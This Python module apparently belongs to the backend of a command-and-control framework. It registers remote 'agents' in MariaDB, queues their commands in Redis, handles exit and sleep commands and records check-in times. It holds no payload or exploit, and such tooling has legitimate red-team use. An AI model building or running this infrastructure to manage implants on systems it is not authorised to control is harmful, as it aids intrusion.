import redis
import requests
from sqlalchemy import create_engine, text
from dotenv import load_dotenv
from datetime import datetime, timezone
import os

RED = "\033[1;31m"
GREEN = "\033[1;92m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

r = redis.Redis(host=os.getenv('REDIS_HOST'), port=6379, db=0, decode_responses=True)

load_dotenv("../.env")
db_user = os.getenv('DB_USER')
db_pass = os.getenv('DB_PASS')
database = os.getenv('DATABASE')
docker_db = os.getenv('DOCKER_DB')

if docker_db == "True" or docker_db == "true":
    db_host = "mariadb"
elif docker_db == "False" or docker_db == "false":
    db_host = os.getenv('HOST')
else:
    db_host = "mariadb"

try:
    URL = f"mysql+pymysql://{db_user}:{db_pass}@{db_host}:3306/{database}"
    engine = create_engine(
        URL,
        pool_size=5, # keep 5 open connections ready
        max_overflow=10, # allow up to 10 extra if demand spikes
        pool_recycle=1800, # recycle connections after 30 min
        pool_pre_ping=True # check if connection is alive before use
    )
except:
    print(f"{RED}Error connecting to MariaDB Platform!{RESET}")

def register_agent(uuid, profile, ip):
    r.rpush(uuid, "AGENT REGISTERED")
    print(f"{CYAN}{uuid} Registered{RESET}")
    utc = datetime.now(timezone.utc)
    checkin = utc.strftime("%Y-%m-%d %H:%M:%S")
    with engine.begin() as conn:
        # Future implement (maybe): read a yaml/json file for the default sleep int. Or Some other work around
        sql_insert = text("INSERT INTO agents (uuid, name, status, first_seen, last_seen, sleep, profile, ip) VALUES (:uuid, :name, :status, :first_seen, :last_seen, :sleep, :profile, :ip)")
        conn.execute(sql_insert, {"uuid": uuid, "name": uuid, "status": "ALIVE", "first_seen": checkin, "last_seen": checkin, "sleep": 10, "profile": profile, "ip": ip})
    return ""

# Check and process small commands. (exit, sleep, etc)
def small_check(uuid):
    cmd = r.lindex(uuid, -2)
    raw_cmd = cmd.split(" ", 1)
    match raw_cmd[0]:
        case "exit":
            r.delete(uuid)
            r.delete(f"{uuid}-output")
            with engine.begin() as conn:
                sql_delete = text("DELETE FROM agents WHERE uuid = :uuid")
                conn.execute(sql_delete, {"uuid": uuid})
        case "sleep":
            with engine.begin() as conn:
                sql_update = text("UPDATE agents SET sleep = :sleep WHERE uuid = :uuid")
                conn.execute(sql_update, {"sleep": raw_cmd[1], "uuid": uuid})


def update_seen(uuid):
    with engine.begin() as conn:
        utc = datetime.now(timezone.utc)
        current_time = utc.strftime("%Y-%m-%d %H:%M:%S")
        update = text("UPDATE agents SET last_seen = :last_seen WHERE uuid = :uuid")
        conn.execute(update, {"last_seen": current_time, "uuid": uuid})